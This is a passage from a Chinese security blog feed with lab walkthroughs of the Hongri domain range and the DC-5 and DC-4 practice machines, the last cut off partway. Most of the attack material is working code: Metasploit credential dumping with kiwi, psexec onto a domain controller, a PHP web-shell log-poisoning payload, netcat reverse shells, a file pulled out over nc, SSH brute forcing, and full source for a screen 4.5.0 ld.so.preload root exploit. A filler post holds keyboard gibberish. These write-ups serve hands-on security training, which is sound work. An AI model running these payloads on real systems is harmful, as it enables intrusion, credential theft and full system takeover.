class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#利用msf进行信息收集</span><br><span class="line">查看当前域,定位域控</span><br><span class="line">net time /domain</span><br><span class="line">查看当前主机网卡</span><br><span class="line">ipconfig /all</span><br><span class="line">查询域管理员</span><br><span class="line">net group &quot;domain admins&quot; /domain </span><br><span class="line">查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net config Workstation </span><br><span class="line">打印路由信息，查看域网段</span><br><span class="line">route print</span><br><span class="line">查看域内账户</span><br><span class="line">net user /domain</span><br><span class="line">-------------------------------</span><br><span class="line">#利用MSF进行内网信息收集</span><br><span class="line">run post/windows/gather/enum_ad_computers</span><br><span class="line">查看域内成员</span><br><span class="line">run post/windows/gather/enum_domain </span><br><span class="line">查看域控</span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line">新建路由</span><br><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">探测内网存活主机</span><br><span class="line">------------------------------</span><br><span class="line">域名：delay.com</span><br><span class="line">域控：dc.de1ay.com [10.10.10.10]</span><br><span class="line">域内主机：DC.  WEB.</span><br><span class="line">域内账户：Administrator,de1ay,Guest,krbtgt,mssql</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%BE%97ping%E5%9F%9F%E6%8E%A7IP-20231118190822-1jepa1u.png" alt="得ping域控IP">​</p><p>​<img src="/assets/%E6%9F%A5%E7%9C%8B%E4%BA%8E%E5%86%85%E6%88%90%E5%91%98-20231118190822-6269rga.png" alt="查看于内成员">​</p><p>​<img src="/assets/%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E8%B4%A6%E6%88%B7-20231118190822-qyd0g2c.png" alt="查看域内账户">​</p><p>​<img src="/assets/%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7-20231118190822-lopuc7k.png" alt="查看域控">​</p><p>​<img src="/assets/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF-20231118190822-olg2kfn.png" alt="路由信息">​</p><h3 id="MSF-Kiwi模块"><a href="#MSF-Kiwi模块" class="headerlink" title="MSF-Kiwi模块"></a>MSF-Kiwi模块</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#加载kiwi</span><br><span class="line">load kiwi</span><br><span class="line">#列出所有凭据</span><br><span class="line">creds_all</span><br><span class="line">#使用kiwi抓取明文密码：</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br><span class="line">#解析NTML值：161cff084477fe596a5db81874498a24</span><br><span class="line">#发现密码为1qaz@WSX</span><br><span class="line">#得到administrator,mssql,</span><br></pre></td></tr></table></figure><p>​<img src="/assets/kiwi%E6%A8%A1%E5%9D%97-20231118191100-uk7pxbt.png" alt="kiwi模块">​</p><p>​<img src="/assets/CMD5-20231118191116-z1tmv84.png" alt="CMD5">​</p><p>​<img src="/assets/kiwi%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231118191116-twmqw0a.png" alt="kiwi命令执行">​</p><h3 id="Hasdump"><a href="#Hasdump" class="headerlink" title="Hasdump"></a>Hasdump</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">#解密为空</span><br><span class="line">---#因为当系统为win10或2012R2以上时，</span><br><span class="line">---#默认在内存缓存中禁止保存明文密码，密码字段显示为null，</span><br><span class="line">---#需要修改注册表等用户重新登录后才能成功抓取。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/hashdump-20231118191242-2w2bz8a.png" alt="hashdump">​</p><p>​<img src="/assets/hashdump%E4%B8%BA%E7%A9%BA-20231118191242-jrxatqd.png" alt="hashdump为空">​</p><h2 id="四、横向渗透"><a href="#四、横向渗透" class="headerlink" title="四、横向渗透"></a>四、横向渗透</h2><h3 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#在MSF的命令执行shell中添加路由</span><br><span class="line">#新建路由</span><br><span class="line">run post/multi/manage/auroute</span><br><span class="line">#查看路由</span><br><span class="line">run autoroute -p</span><br><span class="line">#挂起会话</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set version 4a</span><br><span class="line">set srvport 1080/9050</span><br><span class="line">run</span><br><span class="line">jobs     #执行之后后台会挂起一个jobs</span><br><span class="line"></span><br><span class="line">route add 10.10.10.0 255.255.255.0 session_id</span><br><span class="line"></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks4 127.0.0.1 1080</span><br><span class="line">socks4 127.0.0.1 9050</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1-20231118191657-dtpgte8.png" alt="添加路由">​<img src="/assets/MSF%E4%B8%AD%E4%BB%A3%E7%90%86%E6%A8%A1%E5%9D%97-20231118191702-l4ejo0e.png" alt="MSF中代理模块">​<img src="/assets/%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%90%86-20231118191707-m6gdxch.png" alt="执行代理">​![添加路由 (2)](assets&#x2F;添加路由 2-20231118191716-609obbq.png)​​​​</p><h3 id="扫描内网"><a href="#扫描内网" class="headerlink" title="扫描内网"></a>扫描内网</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -sV 10.10.10.10</span><br><span class="line">proxychains nmap -sT -Pn -sV 10.10.10.201</span><br><span class="line">#发现域控和PC都开启了3389端口445端口</span><br><span class="line">#我们可以远程登录</span><br><span class="line">#也可以利用psexec</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F10%E5%9F%9F%E6%8E%A73389-20231118191809-2phpfdj.png" alt="挂代理扫描10域控3389">​</p><p>​<img src="/assets/%E8%AF%A5%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F201PC-20231118191817-zq2qwtp.png" alt="该代理扫描201PC">​</p><h3 id="利用psexec拿下域控"><a href="#利用psexec拿下域控" class="headerlink" title="利用psexec拿下域控"></a>利用psexec拿下域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exp/win/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 10.10.10.10</span><br><span class="line">set SMBuser de1ay</span><br><span class="line">set SMBpass 1qaz@WSX</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>​<img src="/assets/PSEXEC%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E7%9A%84%E8%AE%BE%E7%BD%AE-20231118192157-qhoi8f3.png" alt="PSEXEC攻击域控的设置">​<img src="/assets/MSF+psexec%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E6%88%90%E5%8A%9F-20231118192253-5b341cp.png" alt="MSF+psexec攻击域控成功">​<img src="/assets/%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7-20231118192326-rdmldif.png" alt="拿下域控">​​​</p><h3 id="3389拿下PC，域控"><a href="#3389拿下PC，域控" class="headerlink" title="3389拿下PC，域控"></a>3389拿下PC，域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">rdesktop 192.168.43.80:3389         #成功</span><br><span class="line">rdesktop 192.168.43.201:3389        #失败</span><br><span class="line">rdesktop 10.10.10.10:3389           #失败</span><br><span class="line">#可以把80当作跳板机，远程登录PC和域控</span><br><span class="line">#CMD远程登录</span><br><span class="line">mstsc /v:10.10.10.10 /f</span><br><span class="line">mstsc /v:10.10.10.201 /f</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-11-15 123823](assets&#x2F;屏幕截图 2023-11-15 123823-20231118192537-2i1yq92.png)​![屏幕截图 2023-11-15 163906](assets&#x2F;屏幕截图 2023-11-15 163906-20231118192542-xf8n3qz.png)​​</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试3</title>
      <link href="/2024/04/11/test3/"/>
      <url>/2024/04/11/test3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>##代码相关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Your code here</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    methods: &#123;</span><br><span class="line">        showNotification() &#123;</span><br><span class="line">            this.$notify(&#123;</span><br><span class="line">                title: &quot;你已被发现😜&quot;,</span><br><span class="line">                message: &quot;小伙子，扒源记住要遵循GPL协议！&quot;,</span><br><span class="line">                position: &#x27;top-left&#x27;,</span><br><span class="line">                offset: 50,</span><br><span class="line">                showClose: true,</span><br><span class="line">                type: &quot;warning&quot;,</span><br><span class="line">                duration: 5000</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>​<code>javascript console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); console.log(&quot;Hello, world!&quot;); ​</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdsafkdsajklfadsghasgsajghsad;g</span><br><span class="line">ksalghasdfg</span><br><span class="line">g</span><br><span class="line">asdfgadsgsa</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-5</title>
      <link href="/2024/04/11/DC/DC-5/"/>
      <url>/2024/04/11/DC/DC-5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><p>#主机探测</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -sP 192.168.43.0/24</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB-20231015155023-akgdcf8.png" alt="D主机存活">​</p><p>#端口扫描</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -sS -T4 -v 192.168.43.8</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dduank%E6%89%AB%E6%8F%8F-20231015155207-dkax237.png" alt="Dduank扫描">80.111</p><p>#目录爆破</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.8 -e php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-20231015155050-jgo8qu1.png" alt="D目录扫描">​</p><p>#Web界面</p><p>啥苟八拉丁语没啥用</p><p>组件：php+nginx1.6.2</p><p>读取nginx配置文件信息，发现nginx日志记录文件路径<br>Nginx配置文件路径： &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>Nginx日志文件所在目录：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log    &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>存在文件包含漏洞</p><p>​<img src="/assets/D80%E7%AB%AF%E5%8F%A3-20231015155315-k3w86h6.png" alt="D80端口">​</p><p>#BP抓包-分析</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /thinkyou.php?file=/etc/passwd HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /thinkyou.php?file=<span class="meta">&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DGET-20231015105915-v2vvb1v.png" alt="DGET"></p><p>​![屏幕截图 2023-10-15 155415](assets&#x2F;屏幕截图 2023-10-15 155415-20231015155420-clfsa37.png)​</p><p>​<img src="/assets/Dnginx%E6%97%A5%E5%BF%97D-20231015155349-vpodfwy.png" alt="Dnginx日志D">​</p><p>​</p><p>#反弹shell</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali：</span><br><span class="line">nc -lvvp 8888</span><br><span class="line"></span><br><span class="line">BP:</span><br><span class="line">GET /thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc -e /bin/sh 192.168.43.33 8888</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dkalinc-20231015155446-nbqtr09.png" alt="Dkalinc"></p><p>​​<img src="/assets/DbpNC-20231015155607-3uibeoi.png" alt="DbpNC">​</p><p>#低权限交互式shell</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>#提权</p><p>尝试SUID</p><p>suid提权：Nmap 、Vim、 find、 Bash、 More 、Less、 Nano 、cp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125;\;</span><br><span class="line"></span><br><span class="line">存在screen 4.5.0</span><br><span class="line">searchsploit screen 4.5.0</span><br><span class="line"></span><br><span class="line">cat 41154.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dscreen-20231015155620-29nbx9j.png" alt="Dscreen"></p><p>‍</p><p>#kali本地编辑</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">创建libhax.c文件</span><br><span class="line">#include <span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include \&lt;unistd.h\&gt;</span><br><span class="line">attribute ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">编译libhax.c文件为libhax.so</span><br><span class="line"></span><br><span class="line">新建rootshell.c</span><br><span class="line">#include <span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">编译rootshell.c文件为rootshell</span><br><span class="line"></span><br><span class="line">创建dc5.sh文件</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshel</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/D51154-20231015155658-xrmtu02.png" alt="D51154">​</p><p>#上传到靶机tmp下 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -nlvp 2333 &lt; libhax.so</span><br><span class="line">nc -nlvp 2333 &lt; rootshell</span><br><span class="line">nc -nlvp 2333 &lt; dc5.sh</span><br><span class="line">目标机：</span><br><span class="line">nc 192.168.43.33 2333 &gt; libhax.so</span><br><span class="line">nc 192.168.43.33 2333 &gt; rootshell</span><br><span class="line">nc 192.168.43.33 2333 &gt; dc5.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D-3nc-20231015155802-5rpx64i.png" alt="D-3nc">​</p><p>#运行dc5.sh </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">ls</span><br><span class="line">chmod +x dc5.sh</span><br><span class="line">./dc5.sh</span><br></pre></td></tr></table></figure><p>#FLAG </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-4</title>
      <link href="/2024/04/11/DC/DC-4/"/>
      <url>/2024/04/11/DC/DC-4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h3 id="主机发现—扫描客户端存活主机：-sP"><a href="#主机发现—扫描客户端存活主机：-sP" class="headerlink" title="#主机发现—扫描客户端存活主机：-sP"></a>#主机发现—扫描客户端存活主机：-sP</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namp -sP 192.168.43.0/24</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><h3 id="端口探测，服务识别—探测端口版本：-sV"><a href="#端口探测，服务识别—探测端口版本：-sV" class="headerlink" title="#端口探测，服务识别—探测端口版本： -sV"></a>#端口探测，服务识别—探测端口版本： -sV</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.43.7</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B-20231014160755-9rns89n.png" alt="DC4端口探测">22，80</p><p>‍</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="#指纹识别"></a>#指纹识别</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://192.168.43.7/</span><br></pre></td></tr></table></figure><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="#目录扫描"></a>#目录扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.7/ -e php -i</span><br></pre></td></tr></table></figure><p>​<img src="/assets/dc4%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-20231014160547-xq6cgfp.png" alt="dc4目录扫描">没什么用</p><h3 id="Hydra爆破–字典为john–没啥用"><a href="#Hydra爆破–字典为john–没啥用" class="headerlink" title="#Hydra爆破–字典为john–没啥用"></a>#Hydra爆破–字典为john–没啥用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/john/password.lst 192.168.43.7 http-get /</span><br></pre></td></tr></table></figure><h3 id="BP抓包爆破-登录界面可以RCE"><a href="#BP抓包爆破-登录界面可以RCE" class="headerlink" title="#BP抓包爆破-登录界面可以RCE"></a>#BP抓包爆破-登录界面可以RCE</h3><p>​<img src="/assets/DC4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231014165551-2xmf2qb.png" alt="DC4命令执行">whoami:www-data  —低权限</p><h3 id="kali机反弹shell"><a href="#kali机反弹shell" class="headerlink" title="#kali机反弹shell"></a>#kali机反弹shell</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br><span class="line"></span><br><span class="line">BP：nc+-e+/bin/bash+192.168.43.33+8888</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4%E5%8F%8D%E5%BC%B9shell-20231014165955-18uv8db.png" alt="DC4反弹shell">空格 &#x3D; +</p><h3 id="低权限交互式shell"><a href="#低权限交互式shell" class="headerlink" title="#低权限交互式shell"></a>#低权限交互式shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="#尝试提权"></a>#尝试提权</h3><p>&#x2F;home&#x2F;jim</p><p>存在三个东西 mbox无权限访问</p><p>‍</p><p>SUID提权:无果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line">find:   这是Linux系统中用于查找文件和目录的命令。</span><br><span class="line">/:           这是find命令的起始路径，从根目录开始进行搜索</span><br><span class="line">-user root:  find命令的一个条件，表示要查找属主为</span><br><span class="line">root的文件。</span><br><span class="line">-perm -4000: find命令的另一个条件，表示要查找具有SUID权限（权限设置为4xxx）的文件。</span><br><span class="line">-print:      find命令的一个动作，表示将符合条件的文件路径输出到标准输出（stdout）</span><br><span class="line">2\&gt;/dev/null: 这是将错误输出（stderr）重定向到/dev/null，即将错误信息丢弃，不显示在终端上。</span><br><span class="line">-type f：     文件类型为f</span><br><span class="line">-exec ls -ldb &#123;&#125;\;  这是 -exec 选项的一部分，用于标记命令的结束。</span><br></pre></td></tr></table></figure><p>&#x2F;home&#x2F;jim 存在old-passwords.bak文件 保存至本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scp /home/jim/backups/old-passwords.bak 192.168.43.33:/home/kali   -----权限不够</span><br><span class="line"></span><br><span class="line">把old-passwords.bak传出来   ----利用nc</span><br><span class="line">kali</span><br><span class="line">nc -lvnp 2334 &gt; old-passwords.txt</span><br><span class="line">靶机</span><br><span class="line">nc 192.168.43.33 2334 &lt; jim/backups/old-passwords.bak</span><br></pre></td></tr></table></figure><h3 id="ssh爆破登录jim"><a href="#ssh爆破登录jim" class="headerlink" title="#ssh爆破登录jim"></a>#ssh爆破登录jim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P /home/kali/old-passwords.txt 192.168.43.7 ssh -vV</span><br><span class="line"></span><br><span class="line">得到密码：jibril04</span><br></pre></td></tr></table></figure><p>​<img src="/assets/DC4ssh%E7%88%86%E7%A0%B4-20231014174628-dt6fqbe.png" alt="DC4ssh爆破">​</p><h3 id="​​ssh登录jim​"><a href="#​​ssh登录jim​" class="headerlink" title="​​ssh登录jim​"></a>​​ssh登录jim​</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.43.7</span><br><span class="line"></span><br><span class="line">查看mbox</span><br><span class="line">cat mbox    ---一封text邮箱</span><br><span class="line">cat /var/mail   --------得到charles的密码:^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">#登录charles</span><br><span class="line">su charles</span><br><span class="line"></span><br><span class="line">提权</span><br><span class="line">切换用户，sudo -l发现提示：teehee命令可无密码以root权限执行</span><br><span class="line">sudo -l</span><br><span 